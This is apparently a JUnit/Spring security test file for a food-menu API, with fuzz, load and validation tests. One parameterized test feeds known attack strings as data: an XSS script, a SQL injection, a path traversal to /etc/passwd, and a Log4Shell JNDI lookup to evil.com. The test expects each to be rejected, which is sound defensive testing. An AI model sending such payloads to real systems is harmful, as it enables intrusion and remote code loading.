package com.example.cardapio.backendTests;

import com.example.cardapio.controller.FoodController;
import com.example.cardapio.service.FoodService;
import com.example.cardapio.backendTests.utils.FuzzGenerator;
import org.junit.jupiter.api.RepeatedTest;
import org.junit.jupiter.api.Test;
import org.junit.jupiter.params.ParameterizedTest;
import org.junit.jupiter.params.provider.ValueSource;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.boot.test.autoconfigure.web.servlet.WebMvcTest;
import org.springframework.http.MediaType;
import org.springframework.test.context.bean.override.mockito.MockitoBean;
import org.springframework.test.web.servlet.MockMvc;

import java.util.stream.IntStream;

import static org.junit.jupiter.api.Assertions.assertNotEquals;
import static org.junit.jupiter.api.Assertions.assertTrue;
import static org.springframework.test.util.AssertionErrors.fail;
import static org.springframework.test.web.servlet.request.MockMvcRequestBuilders.get;
import static org.springframework.test.web.servlet.request.MockMvcRequestBuilders.post;
import static org.springframework.test.web.servlet.result.MockMvcResultMatchers.status;

@WebMvcTest(FoodController.class)
class FoodSecurityTest {

    @Autowired
    private MockMvc mockMvc;

    @MockitoBean
    private FoodService foodService;

    @ParameterizedTest
    @ValueSource(strings = {
            "<script>alert(1)</script>",
            "' OR 1=1 --",
            "../../etc/passwd",
            "${jndi:ldap://evil.com/a}"
    })
    void shouldRejectMaliciousTitle(String maliciousTitle) throws Exception {

        String json = """
        {
          "title": "%s",
          "url": "https://safe.com",
          "price": 10
        }
        """.formatted(maliciousTitle);

        mockMvc.perform(post("/food")
                        .contentType(MediaType.APPLICATION_JSON)
                        .content(json))
                .andExpect(status().isBadRequest());
    }

    @Test
    void shouldHandleLoadWithoutCrashing() {

        IntStream.range(0, 500).parallel().forEach(i -> {
            try {
                mockMvc.perform(get("/food"));
            } catch (Exception e) {
                fail("System crashed under load");
            }
        });
    }

    @RepeatedTest(50)
    void fuzzTestTitleShouldNeverBreakAPI() throws Exception {

        String randomTitle = FuzzGenerator.randomWeirdString();

        String json = """
    {
      "title": "%s",
      "url": "https://safe.com",
      "price": 10
    }
    """.formatted(randomTitle);

        mockMvc.perform(post("/food")
                        .contentType(MediaType.APPLICATION_JSON)
                        .content(json))
                .andExpect(result ->
                        assertTrue(
                                result.getResponse().getStatus() == 200 ||
                                        result.getResponse().getStatus() == 400
                        )
                );
    }

    @RepeatedTest(50)
    void fuzzTestPriceShouldRejectInvalidValues() throws Exception {

        float randomPrice = FuzzGenerator.randomExtremeFloat();

        String json = """
    {
      "title": "Pizza",
      "url": "https://safe.com",
      "price": %s
    }
    """.formatted(randomPrice);

        mockMvc.perform(post("/food")
                        .contentType(MediaType.APPLICATION_JSON)
                        .content(json))
                .andExpect(result ->
                        assertNotEquals(500, result.getResponse().getStatus())
                );
    }

    @RepeatedTest(10)
    void fuzzTest_HugePayload_ShouldFailGracefully() throws Exception {

        String giantTitle = "A".repeat(10_000);

        String json = """
    {
      "title": "%s",
      "url": "https://safe.com",
      "price": 10
    }
    """.formatted(giantTitle);

        mockMvc.perform(post("/food")
                        .contentType(MediaType.APPLICATION_JSON)
                        .content(json))
                .andExpect(result ->
                        assertNotEquals(500, result.getResponse().getStatus())
                );
    }
}
